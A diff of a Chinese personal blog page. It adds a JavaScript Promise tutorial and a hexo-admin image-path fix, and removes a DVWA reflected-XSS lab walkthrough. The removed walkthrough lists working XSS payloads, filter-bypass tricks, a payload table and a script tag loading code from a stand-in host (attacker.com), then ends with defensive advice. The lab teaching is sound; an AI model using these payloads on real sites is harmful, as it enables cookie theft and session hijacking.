+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">123</span>);</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> p4 = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([p1,p2,p4]).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行结果</span></span><br><span class="line">error</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用sleep来模仿浏览器的AJAX请求</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">wait</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res,rej</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">res</span>(wait);</span><br><span class="line">        &#125;,wait);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="title function_">sleep</span>(<span class="number">500</span>);</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="title function_">sleep</span>(<span class="number">500</span>);</span><br><span class="line"><span class="keyword">let</span> p3 = <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([p1,p2,p3]).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//loading</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h2><p><code>Promise.race()</code> 同样是键多个 Promise 实例包装成一个新的 Promise 实例。</p>
+<p>和 all 同样接受多个对象，不同的是 race 接受的对象中，哪个对象返回的快就返回哪个对象。</p>
+<p>就如race直译的赛跑这样。如果对象其中有reject状态的，必须catch捕捉到，如果返回的够快，就返回这个状态。race最终返回的只有一个值。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用sleep来模仿浏览器的AJAX请求</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">wait</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res,rej</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">res</span>(wait);</span><br><span class="line">        &#125;,wait);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p1 = <span class="title function_">sleep</span>(<span class="number">500</span>);</span><br><span class="line"><span class="keyword">let</span> p0 = <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">race</span>([p1,p0]).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p2 = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">race</span>([p0,p2]).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行结果</span></span><br><span class="line"><span class="number">500</span></span><br><span class="line">error</span><br></pre></td></tr></table></figure>
+
+<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><blockquote>
+<p>錯誤處理的聲音實在安靜,安靜得聽不見 from Nolan Lawson </p>
+</blockquote>
+<p>当 promise 被明确拒绝时,会发生拒绝；但是如果是在构造函数回调中引发的错误,则会隐式拒绝。</p>
+<p>为什么说安静，一个例子， Promise 内部的错误外界用 try-catch 捕捉不到</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;I&#x27;m error&quot;</span>);</span><br><span class="line">        <span class="comment">// reject(new Error(&quot;I&#x27;m Error&quot;));</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;catch&#x27;</span>,e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果什么都没打印。<br> 但是抛出的错误可以通过catch来捕捉：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// try &#123;</span></span><br><span class="line">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;I&#x27;m error&quot;</span>);</span><br><span class="line">        <span class="comment">// reject(new Error(&quot;I&#x27;m Error&quot;));</span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="comment">// &#125;catch(e) &#123;</span></span><br><span class="line"><span class="comment">//     console.log(&#x27;catch&#x27;,e);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.<span class="title function_">catch</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>这样就捕捉到错误。所以:</p>
+<p><strong>建议</strong>在 Promise 的链的尾部必须要有个catch接着。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/25/hexo-admin%E6%8F%92%E4%BB%B6%E5%9C%A8windows%E7%B3%BB%E7%BB%9F%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80%E9%94%99%E8%AF%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/01/25/hexo-admin%E6%8F%92%E4%BB%B6%E5%9C%A8windows%E7%B3%BB%E7%BB%9F%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80%E9%94%99%E8%AF%AF/" class="post-title-link" itemprop="url">hexo-admin插件在windows系统插入图片地址错误</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-01-25 23:14:00" itemprop="dateCreated datePublished" datetime="2022-01-25T23:14:00+08:00">2022-01-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>在使用hexo-admin插入图片时，我发现插入的图片显示错误，并且链接也有问题。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">预期</span><br><span class="line">![<span class="string">upload successful</span>](<span class="link">/images/pasted-32.png</span>)</span><br><span class="line">实际</span><br><span class="line">![<span class="string">upload successful</span>](<span class="link">\\images\pasted-32.png\</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p>修改 <code>blog/node_modules/hexo-admin/api.js</code> 文件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filename = path.join(imagePath, filename)</span></span><br><span class="line">filename = imagePath + <span class="string">&#x27;/&#x27;</span> + filename	<span class="comment">// 修改点</span></span><br><span class="line"><span class="keyword">var</span> outpath = path.<span class="title function_">join</span>(hexo.<span class="property">source_dir</span>, filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataURI = req.<span class="property">body</span>.<span class="property">data</span>.<span class="title function_">slice</span>(<span class="string">&#x27;data:image/png;base64,&#x27;</span>.<span class="property">length</span>)</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">Buffer</span>(dataURI, <span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">hexo.<span class="property">log</span>.<span class="title function_">d</span>(<span class="string">`saving image to <span class="subst">$&#123;outpath&#125;</span>`</span>)</span><br><span class="line">fs.<span class="title function_">writeFile</span>(outpath, buf, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    hexo.<span class="property">source</span>.<span class="title function_">process</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        res.<span class="title function_">done</span>(&#123;</span><br><span class="line">            <span class="comment">// src: path.join(hexo.config.root + filename),</span></span><br><span class="line">            <span class="attr">src</span>: filename,	<span class="comment">// 修改点</span></span><br><span class="line">            <span class="attr">msg</span>: msg</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1138,606 +1452,8 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/19/DVWA-XSS-Reflected%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/19/DVWA-XSS-Reflected%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA XSS Reflected 反射型XSS通关教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-02-19 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-19T10:00:00+08:00">2021-02-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>XSS（跨站脚本攻击），老牌漏洞了。简单说就是把恶意 JavaScript 注入到网页里，别人打开这个页面脚本就执行了。反射型 XSS 是最常见的，恶意代码通过 URL 参数传进去，服务器原样返回，浏览器就执行了。</p>
-<p>这关主要学怎么利用反射型 XSS 偷 Cookie 和搞事情。</p>
-<h2 id="XSS-类型"><a href="#XSS-类型" class="headerlink" title="XSS 类型"></a>XSS 类型</h2><table>
-<thead>
-<tr>
-<th>类型</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>反射型</td>
-<td>URL 传参，服务器反射回来</td>
-</tr>
-<tr>
-<td>存储型</td>
-<td>存服务器里，谁访问谁中招</td>
-</tr>
-<tr>
-<td>DOM 型</td>
-<td>纯前端操作，不经过服务器</td>
-</tr>
-</tbody></table>
-<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>用户输入直接输出，啥过滤都没有。</p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>测试 XSS：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>弹窗了，确认有 XSS。</p>
-<p>偷 Cookie：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>外部加载脚本：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://attacker.com/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>img 标签也行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>![图片占位]</p>
-<p>svg 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 过滤了 <code>&lt;script&gt;</code> 标签：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure>
-
-<p>用 <code>str_replace</code> 这种方式，绕过方法太多了。</p>
-<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>大小写混淆：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(&#x27;XSS&#x27;)&lt;/Script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>双写绕过：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/scr&lt;/script&gt;ipt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>中间的 <code>&lt;script&gt;</code> 被删了，剩下又拼成完整的标签了。</p>
-<p>或者干脆不用 <code>&lt;script&gt;</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;XSS&#x27;)&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 级别用正则过滤：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure>
-
-<p>不管你怎么写 <code>&lt;script&gt;</code>，大小写怎么混，中间怎么插字符，都能匹配到并删掉。</p>
-<p>但 XSS 又不是只有 <code>&lt;script&gt;</code> 这一种。</p>
-<h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>img 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>svg 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;alert(document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>body 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>input 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;XSS&#x27;)&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
-
-<p>details 标签：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>能触发 JS 的标签多了去了，过滤不过来的。</p>
-<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别用 <code>htmlspecialchars()</code> 转义：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br></pre></td></tr></table></figure>
-
-<p>把 <code>&lt;</code>、<code>&gt;</code>、<code>&quot;</code>、<code>&#39;</code>、<code>&amp;</code> 这些特殊字符转成 HTML 实体，注入的代码就变成普通文本了。这才是正确的做法。</p>
-<h2 id="常用-XSS-Payload"><a href="#常用-XSS-Payload" class="headerlink" title="常用 XSS Payload"></a>常用 XSS Payload</h2><table>
-<thead>
-<tr>
-<th>Payload</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
-<td>基础测试</td>
-</tr>
-<tr>
-<td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
-<td>图片加载失败触发</td>
-</tr>
-<tr>
-<td><code>&lt;svg onload=alert(1)&gt;</code></td>
-<td>SVG 加载触发</td>
-</tr>
-<tr>
-<td><code>&lt;body onload=alert(1)&gt;</code></td>
-<td>页面加载触发</td>
-</tr>
-<tr>
-<td><code>&lt;input onfocus=alert(1) autofocus&gt;</code></td>
-<td>自动聚焦触发</td>
-</tr>
-<tr>
-<td><code>&lt;details open ontoggle=alert(1)&gt;</code></td>
-<td>展开触发</td>
-</tr>
-<tr>
-<td><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;</code></td>
-<td>点击触发</td>
-</tr>
-</tbody></table>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>XSS 防护要点：</p>
-<ol>
-<li>输出的时候用 <code>htmlspecialchars()</code> 转义</li>
-<li>Cookie 设置 HttpOnly</li>
-<li>配好 CSP</li>
-<li>别想着黑名单过滤，转义才是王道</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/17/DVWA-XSS-DOM-DOM%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/17/DVWA-XSS-DOM-DOM%E5%9E%8BXSS%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA XSS DOM DOM型XSS通关教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-02-17 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-17T10:00:00+08:00">2021-02-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>DOM 型 XSS 是个比较特殊的存在，攻击过程完全不经过服务器，纯前端搞定的。恶意代码通过 JavaScript 写进 DOM 里执行，服务端日志里都看不到啥异常。</p>
-<p>这关主要学怎么利用 DOM 型 XSS。</p>
-<h2 id="DOM-型-XSS-原理"><a href="#DOM-型-XSS-原理" class="headerlink" title="DOM 型 XSS 原理"></a>DOM 型 XSS 原理</h2><p>流程是这样的：</p>
-<ol>
